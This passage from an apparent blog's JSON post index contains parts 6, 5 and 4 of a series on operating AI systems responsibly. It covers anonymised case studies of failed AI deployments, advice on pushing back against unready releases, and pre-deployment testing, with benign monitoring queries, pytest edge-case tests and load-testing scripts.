(spoiler: not much).\u003c/p\u003e","tags":["ai","management","culture","operations","series"],"title":"AI Systems Responsibility: Part 7 - Why Smart People Keep Making Dumb Decisions"},{"content":"This is where I tell you about actual AI deployments that went wrong. Real incidents. Real failures. Real consequences.\nNames changed. Details changed enough that you can\u0026rsquo;t identify the companies. But the failures? Those are real.\n\"Every AI disaster follows the same pattern: someone knew it was broken, someone decided to ship it anyway, and someone else carried the can when it broke in production.\" Part 6 of the series. Case studies. Learn from other people\u0026rsquo;s mistakes so you don\u0026rsquo;t repeat them.\nCase Study 1: The Medical Triage System That Wasn\u0026rsquo;t What they built: AI system to triage emergency department patients. Predict severity, recommend priority.\nWhat they tested: Accuracy on historical data. 92% accurate. Looked great.\nWhat they didn\u0026rsquo;t test: Real-time performance under load. Integration with existing hospital systems. Edge cases.\nWhat broke:\nWeek one in production: System slow. Taking 30 seconds to triage each patient. Emergency department can\u0026rsquo;t wait 30 seconds. Staff start bypassing it.\nWeek two: System starts classifying everything as \u0026ldquo;low priority.\u0026rdquo; Turns out input format from hospital\u0026rsquo;s patient management system changed slightly. Parser broke silently. Model getting garbage inputs, returning garbage outputs.\nWeek three: Someone notices a pattern. System consistently rates chest pain in women as lower priority than chest pain in men. Training data was biased. Model learned the bias.\nThe aftermath:\nSystem pulled after three weeks. Back to manual triage. Hospital spent six months rebuilding trust with staff who now think \u0026ldquo;AI doesn\u0026rsquo;t work.\u0026rdquo;\nWhat they should have done:\nLoad testing before deployment Integration testing with actual hospital systems Bias testing across demographics Monitoring for accuracy in production Human oversight for all predictions What they actually did:\nTested on clean historical data. Shipped when it looked good. Hoped for the best.\nThe monitoring that would have caught this:\nmodel_prediction_latency_seconds{quantile=\u0026#34;0.95\u0026#34;} \u0026gt; 5 model_accuracy_ratio by (gender) \u0026lt; 0.85 Alert on latency spikes and accuracy broken down by demographics.\nCase Study 2: The Fraud Detector That Cried Wolf What they built: Real-time fraud detection for credit card transactions. Flag suspicious transactions, decline automatically.\nWhat they tested: Accuracy on historical fraud data. 97% accuracy. False positive rate: 2%.\nWhat they didn\u0026rsquo;t test: What happens when fraud patterns change. What happens when false positives hit innocent customers.\nWhat broke:\nFirst month: Working fine. Catching fraud. Happy management.\nSecond month: New fraud pattern emerges. Fraudsters figured out the model. Start bypassing it. Fraud rate increases but model doesn\u0026rsquo;t catch it.\nSame time: False positives hitting loyal customers. Legitimate transactions declined. Customers angry. Call center overwhelmed.\nThird month: Someone runs the numbers. Model\u0026rsquo;s catching 60% of fraud (down from 95%). False positive rate up to 8% (up from 2%). But nobody noticed because they were only monitoring \u0026ldquo;system uptime.\u0026rdquo;\nThe aftermath:\nModel retrained. But damage done. Lost customers. Lost revenue. Call center still dealing with angry customers months later.\nWhat they should have done:\nMonitor actual fraud catch rate in production, not just uptime Monitor false positive rate Alert when fraud patterns change Have human review for high-value transactions A/B test before full rollout What they actually did:\nDeployed based on historical accuracy. Assumed it would stay accurate. Didn\u0026rsquo;t monitor what mattered.\nThe monitoring that would have caught this:\nfraud_detection_true_positive_rate \u0026lt; 0.80 fraud_detection_false_positive_rate \u0026gt; 0.05 rate(fraud_detection_total{decision=\u0026#34;block\u0026#34;}[1h]) / rate(fraud_detection_total[1h]) Track actual fraud catch rate (when ground truth becomes available) and false positive rate.\nCase Study 3: The Chatbot That Went Rogue What they built: Customer service chatbot. Handle common queries, escalate complex ones to humans.\nWhat they tested: Response quality on test queries. Looked reasonable.\nWhat they didn\u0026rsquo;t test: Adversarial inputs. Edge cases. What happens when someone tries to break it.\nWhat broke:\nWeek one: Working fine for most queries.\nWeek two: Someone discovers the chatbot will answer questions about anything if you phrase them correctly. Not just company products. Anything.\nWeek three: Chatbot starts giving medical advice. Legal advice. Financial advice. All completely wrong but confidently stated.\nWeek four: Chatbot tells a customer to \u0026ldquo;sue the company\u0026rdquo; when asked about a complaint. Screenshot goes viral on Twitter.\nThe aftermath:\nChatbot pulled immediately. PR nightmare. \u0026ldquo;Company\u0026rsquo;s AI tells customers to sue them\u0026rdquo; in the news.\nWhat they should have done:\nStrict input validation Response filtering Testing with adversarial inputs Clear boundaries on what topics the bot can discuss Human review of escalated conversations What they actually did:\nDeployed based on happy-path testing. Didn\u0026rsquo;t think about what could go wrong.\nThe monitoring that would have caught this:\nchatbot_response_contains_blocked_topic_total \u0026gt; 0 chatbot_input_length_bytes \u0026gt; 1000 rate(chatbot_conversation_total{escalated=\u0026#34;true\u0026#34;}[1h]) Log and alert on blocked topics, unusually long inputs, and escalation rates.\nCase Study 4: The Model That Worked Too Well What they built: Content recommendation system. Suggest articles users might like based on reading history.\nWhat they tested: Click-through rate. Users clicking on recommendations. Metric going up. Success!\nWhat they didn\u0026rsquo;t test: Long-term effects. What content was being recommended. Whether optimization for clicks was good for users.\nWhat broke:\nFirst six months: Click-through rate up 40%. Management delighted. Bonuses all round.\nNext six months: User complaints increasing. \u0026ldquo;Why am I only seeing political content?\u0026rdquo; \u0026ldquo;Why is everything so negative?\u0026rdquo; \u0026ldquo;Why do I keep seeing the same topics?\u0026rdquo;\nInvestigation reveals: Model optimized for clicks. Controversial content gets clicks. Negative content gets clicks. Model started recommending increasingly extreme content to maximize engagement.\nUser satisfaction down. Time on site down. Subscription cancellations up.\nThe aftermath:\nModel retrained with different objectives. But echo chamber already created. Users locked into content bubbles. Hard to undo.\nWhat they should have done:\nMonitor user satisfaction, not just clicks Monitor content diversity in recommendations Test for filter bubble effects Human oversight of recommendation patterns Think about second-order effects What they actually did:\nOptimized for one metric. Ignored everything else.\nThe monitoring that would have caught this:\navg(user_satisfaction_score) \u0026lt; 3.5 recommendation_content_diversity_ratio \u0026lt; 0.3 rate(user_churn_total[7d]) / rate(user_signup_total[7d]) Track user satisfaction, content diversity, and churn alongside engagement.\nCase Study 5: The Model Nobody Could Debug What they built: Loan approval model. Predict likelihood of repayment, approve or deny automatically.\nWhat they tested: Accuracy on historical data. 89% accurate. Better than manual process.\nWhat they didn\u0026rsquo;t test: Explainability. Fairness. What happens when someone asks \u0026ldquo;why was I denied?\u0026rdquo;\nWhat broke:\nFirst few months: Working fine. Approving loans. Denying loans. No problems.\nThen: Customer denied. Asks why. \u0026ldquo;The algorithm decided.\u0026rdquo; Customer complains. Escalates. Threatens legal action.\nTeam tries to figure out why customer was denied. Model is a neural network. 47 layers. Nobody can explain the decision. Not even the data scientists.\nRegulator gets involved. \u0026ldquo;You need to explain your lending decisions.\u0026rdquo; Team can\u0026rsquo;t. Model is a black box.\nThe aftermath:\nModel pulled. Back to manual review for sensitive cases. Spent a year rebuilding with explainable models.\nWhat they should have done:\nUse explainable models for high-stakes decisions Document decision factors Test explanations with humans Keep humans in the loop for decisions that need explanation What they actually did:\nUsed the most accurate model without thinking about explainability.\nThe monitoring that would have caught this:\nloan_decision_explainability_score \u0026lt; 0.5 loan_decision_time_seconds{requires_explanation=\u0026#34;true\u0026#34;} \u0026gt; 30 rate(loan_complaints_total{reason=\u0026#34;unexplained_decision\u0026#34;}[7d]) Track when explanations fail and correlate with complaints.\nCase Study 6: The Infrastructure That Couldn\u0026rsquo;t Scale What they built: Image recognition system. Classify product images automatically.\nWhat they tested: Accuracy on test images. Speed on single-image processing.\nWhat they didn\u0026rsquo;t test: Performance at scale. What happens when thousands of images hit simultaneously.\nWhat broke:\nLaunch day: Marketing campaign goes live. Traffic spikes. Image uploads flood in.\nModel server: 8 requests per second. Image queue: 2000 images waiting. Processing time: 4 hours to clear queue.\nUsers: Uploading images. Waiting. Nothing happening. Assuming it\u0026rsquo;s broken. Uploading again. Making it worse.\nSystem: Falling over completely. GPU out of memory. Requests timing out. Everything broken.\nThe aftermath:\nEmergency scale-up. More servers. More GPUs. Cost 10x what was budgeted. System eventually stable but expensive.\nWhat they should have done:\nLoad testing before launch Auto-scaling infrastructure Queue management and backpressure User communication when system is slow What they actually did:\nTested single-image performance. Assumed it would scale. It didn\u0026rsquo;t.\nThe monitoring that would have caught this:\nimage_queue_depth \u0026gt; 100 image_processing_latency_seconds{quantile=\u0026#34;0.99\u0026#34;} \u0026gt; 10 rate(image_processing_errors_total[5m]) / rate(image_processing_total[5m]) \u0026gt; 0.05 gpu_memory_used_bytes / gpu_memory_total_bytes \u0026gt; 0.9 Track queue depth, latency at P99, error rates, and GPU memory before launch.\nCommon Patterns Every case study has the same themes:\n1. Testing what\u0026rsquo;s easy, not what matters\nAccuracy on test data is easy to measure. Production performance is hard. Guess which one gets tested.\n2. Monitoring the wrong things\nUptime is easy to monitor. Accuracy, bias, user satisfaction are hard. Guess which one gets monitored.\n3. Optimizing for the wrong metrics\nClicks are easy to measure. User satisfaction is hard. Guess which one gets optimized.\n4. Shipping before it\u0026rsquo;s ready\nDeadline is Friday. Model isn\u0026rsquo;t ready. Ship anyway. Deal with consequences later.\n5. Ignoring known problems\n\u0026ldquo;We\u0026rsquo;ll fix that in v2.\u0026rdquo; Narrator: They didn\u0026rsquo;t.\n6. No rollback plan\n\u0026ldquo;We\u0026rsquo;ll figure it out if we need to.\u0026rdquo; Narrator: At 3am, under pressure, they couldn\u0026rsquo;t.\nWhat You Can Learn From Case Study 1 (Medical Triage): Test integration. Test under load. Test for bias. Don\u0026rsquo;t assume clean test data represents production.\nFrom Case Study 2 (Fraud Detection): Monitor what matters, not what\u0026rsquo;s easy. Accuracy degrades over time. Alert on it.\nFrom Case Study 3 (Chatbot): Test adversarial inputs. Set boundaries. Filter outputs. Don\u0026rsquo;t assume users will play nice.\nFrom Case Study 4 (Recommendations): Optimizing one metric breaks everything else. Monitor second-order effects. Think long-term.\nFrom Case Study 5 (Loan Approval): High-stakes decisions need explainability. Black boxes are legal liability. Use interpretable models.\nFrom Case Study 6 (Image Recognition): Test at scale. Plan for scale. Budget for scale. Single-image performance doesn\u0026rsquo;t predict production performance.\nThe Pattern You\u0026rsquo;ll See Someone builds a model. Tests it on clean data. Gets good accuracy. Ships it.\nProduction is messy. Data is messy. Users are messy. Model breaks.\nIncident happens. Rollback happens. Post-mortem happens. \u0026ldquo;We need better testing.\u0026rdquo;\nEveryone agrees. Then the next deadline hits and the cycle repeats.\nThe only way to break the cycle: Actually do the testing. Actually set up monitoring. Actually have a rollback plan. Actually say no when it\u0026rsquo;s not ready.\nWill that slow you down? Yes.\nWill that save you from 3am incidents? Also yes.\nPart 7 Preview That\u0026rsquo;s the end of the core series. But there\u0026rsquo;s one more topic: the organizational side. Why do smart people keep making the same mistakes? Why does testing get skipped? Why do known problems get shipped?\nNext time: The organizational dysfunction that makes AI incidents inevitable.\nPart 6 of N in a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring | Part 3: Incident Response | Part 4: Testing | Part 5: When to Say No\n","date":"16 Jan 2026","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-6/","summary":"\u003cp\u003eThis is where I tell you about actual AI deployments that went wrong. Real incidents. Real failures. Real consequences.\u003c/p\u003e\n\u003cp\u003eNames changed. Details changed enough that you can\u0026rsquo;t identify the companies. But the failures? Those are real.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"Every AI disaster follows the same pattern: someone knew it was broken, someone decided to ship it anyway, and someone else carried the can when it broke in production.\"\n\u003c/aside\u003e\n\u003cp\u003ePart 6 of the series. Case studies. Learn from other people\u0026rsquo;s mistakes so you don\u0026rsquo;t repeat them.\u003c/p\u003e","tags":["ai","case-studies","operations","series"],"title":"AI Systems Responsibility: Part 6 - Case Studies (What Actually Goes Wrong)"},{"content":" Management: We need to deploy the customer sentiment analysis model by end of week.\nSysadmin: It\u0026rsquo;s not ready.\nManagement: The client\u0026rsquo;s expecting it.\nSysadmin: It fails on 30% of non-English inputs. Your client has international customers.\nManagement: We\u0026rsquo;ll fix that in the next release.\nSysadmin: No.\nManagement: What do you mean, no?\nSysadmin: I mean no. We\u0026rsquo;re not deploying broken software because someone made a promise we can\u0026rsquo;t keep.\nThis conversation never goes well. Have it anyway.\n\"The person saying 'we can't ship this' is always the bad guy. Right up until production breaks and suddenly everyone's asking why we didn't catch this in testing.\" Part 5 of the series. This one\u0026rsquo;s about saying no. When to do it, how to do it, and how to not get fired for it.\nWhen to Say No 1. The model hasn\u0026rsquo;t been tested properly\nYou ran it on validation data. Got good accuracy. Haven\u0026rsquo;t tested edge cases, haven\u0026rsquo;t tested integration, haven\u0026rsquo;t tested under load.\nThis is a no. Doesn\u0026rsquo;t matter how good the accuracy looks. Doesn\u0026rsquo;t matter what management promised.\nUntested models break in production. It\u0026rsquo;s not \u0026ldquo;if.\u0026rdquo; It\u0026rsquo;s \u0026ldquo;when.\u0026rdquo;\n2. The model has known critical failures\nYour fraud detection model works great except it flags all transactions from Alaska as fraudulent. Known issue. Not fixed yet.\n\u0026ldquo;We\u0026rsquo;ll add Alaska to the exception list in production.\u0026rdquo;\nNo. Fix it properly or don\u0026rsquo;t ship it.\n3. You can\u0026rsquo;t roll back\nNew model ready to deploy. Rollback procedure? \u0026ldquo;We\u0026rsquo;ll figure it out if we need to.\u0026rdquo;\nThat\u0026rsquo;s a no. You need a tested rollback procedure before you deploy. Not after things break.\n4. The monitoring doesn\u0026rsquo;t exist\n\u0026ldquo;How will we know if it\u0026rsquo;s working in production?\u0026rdquo;\n\u0026ldquo;We\u0026rsquo;ll watch the logs.\u0026rdquo;\nNo. You need proper monitoring. Accuracy tracking, drift detection, latency alerts. Without monitoring, you\u0026rsquo;re flying blind.\n5. Nobody understands how it works\nThe data scientist who built it quit. Documentation is sparse. Nobody on the team can explain what it\u0026rsquo;s doing or how to debug it.\nHard no. You\u0026rsquo;re not deploying a black box that nobody understands.\n6. The model is biased\nTesting shows the model performs significantly worse for certain demographics. Or makes systematically unfair predictions.\n\u0026ldquo;We\u0026rsquo;ll address that in v2.\u0026rdquo;\nNo. Fix it now or don\u0026rsquo;t ship it. This isn\u0026rsquo;t just ethics. This is legal liability.\n7. The infrastructure can\u0026rsquo;t handle it\nModel needs 64GB GPU. You have 32GB GPU.\n\u0026ldquo;It\u0026rsquo;ll probably work.\u0026rdquo;\nIt won\u0026rsquo;t. Don\u0026rsquo;t ship it.\n8. The risk is disproportionate to the benefit\nMedical diagnosis model that\u0026rsquo;s 70% accurate. \u0026ldquo;It\u0026rsquo;s better than nothing!\u0026rdquo;\nIt\u0026rsquo;s not better than nothing. It\u0026rsquo;s dangerous. If you can\u0026rsquo;t get it to acceptable accuracy, don\u0026rsquo;t ship it.\nPre-Deployment Checklist (The Minimum Bar) Before you say yes to any deployment, verify these:\n[ ] Model tested on real production-like data (not just validation set) [ ] Edge cases tested (nulls, unicode, extreme values, adversarial inputs) [ ] Integration tested with actual upstream/downstream services [ ] Load tested at 2-3x expected traffic [ ] Rollback procedure documented and tested (\u0026lt; 5 minutes) [ ] Monitoring in place (accuracy, latency, error rate, drift detection) [ ] Alerts configured and tested (someone gets paged when things break) [ ] Known failure modes documented [ ] Someone on-call understands how to debug it [ ] Human fallback available for critical decisions If any box is unchecked, you have grounds to push back. Not \u0026ldquo;I feel uncomfortable\u0026rdquo; - \u0026ldquo;the deployment checklist isn\u0026rsquo;t complete.\u0026rdquo;\nThis doesn\u0026rsquo;t guarantee success. It does guarantee you\u0026rsquo;ve done the minimum due diligence.\nHow to Say No (The First Time) Start with facts:\n\u0026ldquo;The model fails on edge case X. Here\u0026rsquo;s the test results. Here\u0026rsquo;s the failure rate. We can\u0026rsquo;t ship this.\u0026rdquo;\nNot opinions. Not feelings. Facts. Data. Test results.\nManagement response: \u0026ldquo;Can we ship it anyway and fix it later?\u0026rdquo;\n\u0026ldquo;No. Here\u0026rsquo;s why:\u0026rdquo; [Explain the risk. Explain the impact. Explain why fixing it in production is worse than fixing it now.]\nManagement response: \u0026ldquo;But we promised the client.\u0026rdquo;\n\u0026ldquo;That\u0026rsquo;s not my problem. My problem is not shipping broken software. Your problem is managing client expectations.\u0026rdquo;\nThis will not make you popular. Do it anyway.\nHow to Say No (When They Push Back) They\u0026rsquo;ll push back. They always do. Here\u0026rsquo;s what you\u0026rsquo;ll hear and how to respond:\n\u0026ldquo;We can fix it in production.\u0026rdquo;\n\u0026ldquo;No, we can\u0026rsquo;t. Production issues take longer to fix because we\u0026rsquo;re under pressure, users are affected, and we don\u0026rsquo;t have the same flexibility to test. Fix it now.\u0026rdquo;\n\u0026ldquo;It\u0026rsquo;s good enough for v1.\u0026rdquo;\n\u0026ldquo;Good enough for v1 means it works. This doesn\u0026rsquo;t work. When it breaks, we\u0026rsquo;ll be blamed for shipping something we knew was broken.\u0026rdquo;\n\u0026ldquo;We\u0026rsquo;ll lose the client if we don\u0026rsquo;t ship.\u0026rdquo;\n\u0026ldquo;We\u0026rsquo;ll lose the client faster if we ship broken software. Would you rather delay by two weeks or have the client lose trust completely?\u0026rdquo;\n\u0026ldquo;Can\u0026rsquo;t you just make it work?\u0026rdquo;\n\u0026ldquo;If I could make it work, I would have. It needs proper testing, proper monitoring, and proper infrastructure. That takes time.\u0026rdquo;\n\u0026ldquo;Everyone else is shipping AI. We\u0026rsquo;re falling behind.\u0026rdquo;\n\u0026ldquo;Everyone else is also having 3am incidents because they shipped garbage. We can either ship fast or ship reliable. Pick one.\u0026rdquo;\n\u0026ldquo;Your job is to deploy what we build.\u0026rdquo;\n\u0026ldquo;My job is to keep production running. Deploying broken software makes that impossible.\u0026rdquo;\nWhen You\u0026rsquo;ll Lose You won\u0026rsquo;t always win. Sometimes management will overrule you. Sometimes they\u0026rsquo;ll deploy it anyway.\nWhen this happens:\n1. Document everything\nEmail confirming your objections. Test results showing the problems. Specific risks identified. Send it to management. CC yourself. Keep a copy.\nNot to cover your arse (though it does that too). To have a record when things break.\nTemplate for documenting objections:\nSubject: Deployment Risk Assessment - [Model/System Name] Summary: I\u0026#39;m documenting my concerns about deploying [model/system] to production. Issues Identified: 1. [Specific issue - e.g., \u0026#34;Model fails on non-English inputs (30% failure rate)\u0026#34;] - Evidence: [Test results, data, metrics] - Impact: [What happens if this breaks in production] 2. [Next issue] - Evidence: [...] - Impact: [...] Recommendation: [Delay deployment / Fix before shipping / Add compensating controls] Risk if Deployed Anyway: - [Specific outcome - e.g., \u0026#34;International customers will receive incorrect predictions\u0026#34;] - [Business impact - e.g., \u0026#34;Estimated X% of users affected\u0026#34;] My Position: I recommend [not deploying / deploying with conditions] until [specific criteria met]. If the decision is to proceed despite these concerns, I request: 1. This email be acknowledged 2. [Specific monitoring/controls] be implemented 3. [Specific rollback criteria] be agreed Sent: [Date/Time] [Your Name] Send this before the deployment. Not after. After is too late.\n2. Demand monitoring\nIf they\u0026rsquo;re shipping it anyway, you need monitoring. Not optional. Mandatory. Accuracy tracking, drift detection, error rates, everything.\nWhen it breaks, you need data to prove what broke and when.\n3. Prepare for the incident\nThey\u0026rsquo;re shipping broken software. It will break. Have your incident response ready. Have your rollback tested. Have your escalation path clear.\n4. Don\u0026rsquo;t say \u0026ldquo;I told you so\u0026rdquo;\nWhen it breaks, resist the urge. Everyone knows you objected. Everyone knows you were right. Saying it out loud just makes you look petty.\nInstead: \u0026ldquo;Here\u0026rsquo;s what broke. Here\u0026rsquo;s how we fix it. Here\u0026rsquo;s how we prevent it next time.\u0026rdquo;\nBe professional even when they weren\u0026rsquo;t.\nWhen You\u0026rsquo;ll Win Sometimes they\u0026rsquo;ll listen. Sometimes you\u0026rsquo;ll say no and they\u0026rsquo;ll actually delay the deployment.\nWhen this happens:\n1. Use the time wisely\nYou bought time. Use it to fix the problems properly. Not half-arsed workarounds. Proper fixes.\n2. Communicate progress\nKeep management updated. \u0026ldquo;Here\u0026rsquo;s what we\u0026rsquo;re fixing. Here\u0026rsquo;s the timeline. Here\u0026rsquo;s when we can ship.\u0026rdquo;\nDon\u0026rsquo;t make them regret listening to you.\n3. Ship when it\u0026rsquo;s ready\nDon\u0026rsquo;t rush just because you delayed once. Ship when the tests pass, when the monitoring is in place, when the rollback works.\n4. Make sure it works\nNothing undermines your credibility faster than saying \u0026ldquo;we need more time\u0026rdquo; and then shipping something that breaks anyway.\nIf you demanded time to fix it, fix it properly.\nBuilding Political Capital Saying no costs political capital. You need to build it first.\nHow to build capital:\nBe right. When you say something will break, it should break. When you say something will work, it should work. Fix things quickly. When production breaks, fix it fast. Be reliable. Communicate clearly. No jargon. No excuses. Clear explanations of what\u0026rsquo;s happening and why. Deliver wins. Ship things that work. Hit deadlines when possible. Be known for getting things done. How to spend capital:\nSay no only when it matters. Not every issue is a hill to die on. Pick your battles. When you say no, have data. Not opinions, data. When you say no, offer alternatives. \u0026ldquo;We can\u0026rsquo;t ship Friday, but we can ship Monday with these fixes.\u0026rdquo; You only get to say no if people trust your judgment. Build that trust.\nWhat Happens When You Don\u0026rsquo;t Say No You know the model is broken. You know it shouldn\u0026rsquo;t ship. But you don\u0026rsquo;t push back. You deploy it anyway.\nIt breaks in production. 3am incident. Rollback. Post-mortem.\nManagement: \u0026ldquo;Why didn\u0026rsquo;t we catch this in testing?\u0026rdquo;\nYou: \u0026ldquo;We did. I raised concerns.\u0026rdquo;\nManagement: \u0026ldquo;Why didn\u0026rsquo;t you push back harder?\u0026rdquo;\nYou: \u0026ldquo;I did.\u0026rdquo;\nManagement: \u0026ldquo;Not hard enough.\u0026rdquo;\nAnd suddenly it\u0026rsquo;s your fault for not stopping them from doing the thing they insisted on doing.\nThis is unfair. This is also reality.\nWhen you know something\u0026rsquo;s wrong and you don\u0026rsquo;t say no, you own the consequences.\nThe Line You Can\u0026rsquo;t Cross There\u0026rsquo;s a line. On one side: push back, document objections, ship when overruled. On the other side: refuse to deploy, escalate over management\u0026rsquo;s head, threaten to quit.\nWhere\u0026rsquo;s the line? Depends on the risk.\nDeploying a model with 85% accuracy instead of 90%? Push back, document, ship if overruled.\nDeploying a medical diagnosis model with known critical failures? Escalate. Refuse if necessary.\nYou need to know where your line is. Because someday you\u0026rsquo;ll reach it.\nPart 6 Preview Next time: Case studies. Real examples of AI deployments going wrong. What broke, why it broke, what we can learn.\nNames changed to protect the guilty. Lessons learned the hard way.\nPart 5 of N in a series on running AI systems. Part 1: Who Carries the Can? | Part 2: Monitoring | Part 3: Incident Response | Part 4: Testing\n","date":"9 Jan 2026","permalink":"https://gazsecops.github.io/posts/ai-systems-responsibility-part-5/","summary":"\u003cdiv class=\"dialogue\"\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We need to deploy the customer sentiment analysis model by end of week.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e It\u0026rsquo;s not ready.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e The client\u0026rsquo;s expecting it.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e It fails on 30% of non-English inputs. Your client has international customers.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e We\u0026rsquo;ll fix that in the next release.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e No.\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-management\"\u003eManagement:\u003c/span\u003e What do you mean, no?\u003c/p\u003e\n\u003cp\u003e\u003cspan class=\"speaker speaker-sysadmin\"\u003eSysadmin:\u003c/span\u003e I mean no. We\u0026rsquo;re not deploying broken software because someone made a promise we can\u0026rsquo;t keep.\u003c/p\u003e\n\u003c/div\u003e\n\u003cp\u003eThis conversation never goes well. Have it anyway.\u003c/p\u003e\n\u003caside class=\"pullquote\"\u003e\n\"The person saying 'we can't ship this' is always the bad guy. Right up until production breaks and suddenly everyone's asking why we didn't catch this in testing.\"\n\u003c/aside\u003e\n\u003cp\u003ePart 5 of the series. This one\u0026rsquo;s about saying no. When to do it, how to do it, and how to not get fired for it.\u003c/p\u003e","tags":["ai","management","operations","series"],"title":"AI Systems Responsibility: Part 5 - When to Say No (And How to Make It Stick)"},{"content":" Engineer: We\u0026rsquo;ve tested the model. It works.\nSysadmin: What did you test?\nEngineer: We ran it on the validation set. 94% accuracy.\nSysadmin: What about edge cases?\nEngineer: What edge cases?\nSysadmin: The ones that will break it in production.\nEngineer: We\u0026rsquo;ll handle those when we see them.\nAnd that\u0026rsquo;s how you end up debugging at 3am.\n\"Testing that your model loads and returns predictions is not testing. That's checking if Python still works. Testing is finding out all the ways your model breaks before your users do.\" Part 4 of the series. This one\u0026rsquo;s about testing AI systems before deployment. Not the \u0026ldquo;it runs on my laptop\u0026rdquo; kind of testing. The \u0026ldquo;I\u0026rsquo;ve actively tried to break this and couldn\u0026rsquo;t\u0026rdquo; kind of testing.\nThe Standard Testing (Which Is Worthless) Most teams test AI like this:\nSplit data into training/validation/test sets Train on training set Measure accuracy on validation set Adjust hyperparameters Measure accuracy on test set If test accuracy is good, ship it This tells you one thing: your model performs well on data that looks like your training data.\nIt tells you nothing about:\nHow it performs on data that doesn\u0026rsquo;t look like training data How it handles edge cases How it fails when inputs are malformed How it behaves under load How it integrates with the rest of your system Congratulations, you\u0026rsquo;ve confirmed that supervised learning works. Now do actual testing.\nWhat Actually Needs Testing 1. Edge cases and boundary conditions\nYour model was trained on normal data. What happens with abnormal data?\nEmpty inputs Null values Extremely long inputs Extremely short inputs Special characters Unicode (emojis, non-Latin scripts) Inputs outside the expected range Inputs in different formats than expected Take your production model. Feed it garbage. See what happens. If it crashes, that\u0026rsquo;s actually good - at least you get an error. Worse is when it confidently returns nonsense.\nQuick edge case test with pytest:\nimport pytest from model import predict class TestEdgeCases: def test_empty_input(self): result = predict(\u0026#34;\u0026#34;) assert result is not None def test_null_input(self): result = predict(None) assert result is not None def test_extremely_long_input(self): result = predict(\u0026#34;x\u0026#34; * 100000) assert result is not None def test_unicode_emoji(self): result = predict(\u0026#34;hello 🎉 world 🚀 test\u0026#34;) assert result is not None def test_non_latin(self): result = predict(\u0026#34;你好世界 مرحبا بالعالم\u0026#34;) assert result is not None Run with: pytest test_edge_cases.py -v\n2. Adversarial inputs\nSomeone will try to game your model. Test for it.\nSpam filter? Try inputs designed to look like legitimate email. Fraud detection? Try transactions designed to look legitimate. Content moderation? Try content that\u0026rsquo;s technically within the rules but clearly shouldn\u0026rsquo;t be.\nIf you\u0026rsquo;re not actively trying to fool your model, someone else will. Better you find the vulnerabilities first.\n3. Data distribution shift\nYour model trained on data from Q1 2024. What happens when you run it on Q4 2024 data? Or 2025 data?\nTake old models. Run them on recent data. See how accuracy degrades over time. This tells you how often you need to retrain.\nIf your model from six months ago is useless on today\u0026rsquo;s data, you\u0026rsquo;re going to be retraining constantly. Plan accordingly.\n4. Minority classes and underrepresented groups\nYour model has 95% accuracy overall. Great. What\u0026rsquo;s the accuracy for:\nThe smallest class in your dataset Data from underrepresented demographics Rare but important edge cases A model that\u0026rsquo;s 98% accurate on common cases and 40% accurate on rare cases is a liability. Because the rare cases are often the important ones.\nMedical diagnosis model? The rare diseases are often the serious ones. Financial fraud? The unusual transactions are often the fraudulent ones.\nTest these specifically. Don\u0026rsquo;t hide behind overall accuracy.\n5. Performance under load\nYour model handles 10 requests per second in testing. What about 1000 requests per second?\nLoad test it. See what happens when:\nGPU memory fills up Request queue backs up Latency increases Timeouts start firing Does it degrade gracefully? Or does it fall over completely?\nAlso test: what happens when multiple models are running simultaneously? Because in production, you\u0026rsquo;ll have old model running while new model spins up. Can your infrastructure handle both?\nQuick load test with Locust:\nfrom locust import HttpUser, task, between class ModelUser(HttpUser): wait_time = between(0.1, 0.5) @task def predict(self): self.client.post(\u0026#34;/predict\u0026#34;, json={ \u0026#34;text\u0026#34;: \u0026#34;sample input for testing\u0026#34; }) Run with: locust -f locustfile.py --host http://model-service:8080\nOr with k6:\nimport http from \u0026#39;k6/http\u0026#39;; import { check, sleep } from \u0026#39;k6\u0026#39;; export let options = { stages: [ { duration: \u0026#39;30s\u0026#39;, target: 20 }, { duration: \u0026#39;1m\u0026#39;, target: 100 }, { duration: \u0026#39;30s\u0026#39;, target: 200 }, ], }; export default function () { let payload = JSON.stringify({ text: \u0026#39;sample input\u0026#39; }); let res = http.post(\u0026#39;http://model-service:8080/predict\u0026#39;, payload); check(res, { \u0026#39;status was 200\u0026#39;: (r) =\u0026gt; r.status == 200 }); sleep(0.1); } Run with: k6 run loadtest.js\n6. Integration testing\nYour model works in isolation. Does it work when integrated with the rest of your system?\nCan upstream services provide the inputs it needs? Can downstream services handle its outputs? What happens when upstream is slow? What happens when downstream is unavailable? Does error handling work end-to-end? I\u0026rsquo;ve seen models that work perfectly in isolation break completely when integrated because nobody tested the full pipeline.\nValidate input data with Great Expectations:\nimport great_expectations as gx import pandas as pd df = pd.read_json(\u0026#34;inputs.json\u0026#34;) expectation_suite = gx.ExpectationSuite(name=\u0026#34;model_inputs\u0026#34;) expectation_suite.add_expectation( gx.expectations.ExpectColumnValuesToNotBeNull(column=\u0026#34;user_id\u0026#34;) ) expectation_suite.add_expectation( gx.expectations.ExpectColumnValuesToBeBetween( column=\u0026#34;age\u0026#34;, min_value=0, max_value=120 ) ) expectation_suite.add_expectation( gx.expectations.ExpectColumnValuesToBeInSet( column=\u0026#34;country\u0026#34;, value_set=[\u0026#34;US\u0026#34;, \u0026#34;UK\u0026#34;, \u0026#34;DE\u0026#34;, \u0026#34;FR\u0026#34;] ) ) results = gx.validate(df, expectation_suite) if not results.success: print(\u0026#34;Input validation failed!\u0026#34;) for result in results.results: if not result.success: print(f\u0026#34; {result.expectation_config.column}: {result.result}\u0026#34;) 7. Rollback testing\nCan you actually roll back? Don\u0026rsquo;t assume. Test it.\nDeploy new model. Roll back to old model. Verify old model works. Do this in staging before you 